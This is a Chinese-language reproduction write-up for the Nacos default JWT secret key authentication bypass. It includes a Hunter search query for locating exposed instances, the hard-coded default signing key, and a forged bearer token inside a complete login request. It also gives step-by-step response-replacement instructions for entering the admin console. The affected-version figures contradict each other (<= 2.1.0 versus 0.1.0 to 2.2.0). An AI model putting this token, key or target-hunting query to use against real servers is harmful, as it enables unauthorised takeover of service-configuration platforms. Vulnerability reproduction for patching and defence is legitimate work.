# Nacos默认key导致权限绕过登陆漏洞

# 一、漏洞简介
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</font><font style="color:rgba(0, 0, 0, 0.9);">Nacos中发现影响Nacos <= 2.1.0的问题，</font><font style="color:rgb(51, 51, 51);">nacos在默认情况下未对token.secret.key进行修改，导致攻击者可以绕过密钥认证进入后台。</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">0.1.0 <= Nacos <= 2.2.0</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ 特征

![1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937.png](./img/LOnCocDcUxyM3hX0/1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937-478295.png)

# 四、漏洞复现
1. <font style="color:rgb(51, 51, 51);">Nacos的token.secret.key值是固定死的</font>

```plain
nacos/conf/application.properties   //位于该文件中

SecretKey012345678901234567890123456789012345678901234567890123456789
```

2. 构造JWT

![1706099878073-f9c28eee-f92e-45b8-a9b6-91a32ac4d665.png](./img/LOnCocDcUxyM3hX0/1706099878073-f9c28eee-f92e-45b8-a9b6-91a32ac4d665-712417.png)

3. <font style="color:rgb(51, 51, 51);">构造数据包获取accesstoken</font>

```plain
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 
Content-Length: 28
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA3MDk1MzY0M30.XPfd1WnNHqQdu5-D734ishsizYCEbsQG7mVwdm4MyWg
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=nacos&password=1111
```

![1706099933954-9f0cd917-8496-4902-85be-b27384144f06.png](./img/LOnCocDcUxyM3hX0/1706099933954-9f0cd917-8496-4902-85be-b27384144f06-367564.png)

4. 登录系统

<font style="color:rgb(51, 51, 51);">将返回包内容全部复制，然后在登陆时抓包，拦截返回包替换，然后发包即可登录后台</font>

<font style="color:rgb(51, 51, 51);">在账号密码错误的情况下返回包为403</font>

![1706100054649-9f5b4daa-8e47-417b-9bc2-066fa69a952c.png](./img/LOnCocDcUxyM3hX0/1706100054649-9f5b4daa-8e47-417b-9bc2-066fa69a952c-448988.png)

<font style="color:rgb(51, 51, 51);">将拦截的返回包替换为之前的返回包内容</font>

![1706100091608-5358f465-fbf8-4d00-a8c0-495b4b9da471.png](./img/LOnCocDcUxyM3hX0/1706100091608-5358f465-fbf8-4d00-a8c0-495b4b9da471-231976.png)

<font style="color:rgb(51, 51, 51);">发包之后成功登录后台</font>

![1706100115758-2cc1be63-70c6-4198-8c44-bf6fc2e8d617.png](./img/LOnCocDcUxyM3hX0/1706100115758-2cc1be63-70c6-4198-8c44-bf6fc2e8d617-715031.png)



> 更新: 2024-10-28 15:59:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pg7g9r320fwlmxap>